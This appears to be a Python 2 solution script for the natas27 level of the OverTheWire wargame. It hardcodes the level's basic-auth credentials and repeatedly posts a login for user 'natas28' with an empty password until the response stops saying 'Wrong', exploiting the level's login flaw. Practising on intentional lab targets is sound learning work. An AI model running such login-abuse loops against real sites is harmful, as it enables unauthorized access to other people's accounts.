

import base64
from datetime import datetime
import requests
import pprint
import random

TARGET_URL = 'http://natas27.natas.labs.overthewire.org/index.php'

AUTH = ('natas27', '55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ')

i = 0
while True:
    r = requests.post(TARGET_URL, auth=AUTH, data={'username':'natas28', 'password':''}, headers={"Content-type":"application/x-www-form-urlencoded"})
    if 'Wrong' not in r.text:
        print r.text
        break
    i += 1

print "after", i, "requests"
